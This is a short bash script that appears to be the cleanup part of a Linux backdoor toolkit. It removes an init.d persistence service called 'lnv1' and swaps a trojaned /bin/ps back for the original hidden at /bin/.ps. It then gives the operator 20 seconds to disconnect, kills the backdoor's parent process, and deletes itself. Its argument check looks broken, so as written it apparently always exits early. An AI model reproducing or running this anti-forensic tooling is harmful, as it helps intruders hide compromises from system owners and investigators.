#!/bin/bash

vv=$3
if [ -v vv ];then
	echo 'Usage: ./clear_per_linux.sh & disown -h $!'
	echo 'After execute this command, you must close the conection before 20 seconds'
	exit
fi
update-rc.d lnv1 remove
rm /etc/init.d/lnv1
if [ -f /bin/.ps ];then
	rm /bin/ps
	mv /bin/.ps /bin/ps
fi
echo "Please, write \"exit\" and press Enter to kill the process in background from this computer, you have 20 seconds..."
sleep 20
kill $(ps -o ppid= -p $(ps -aux | grep '20\.354654' | awk '{print $2}'))
rm `pwd`/clear_per_linux.sh
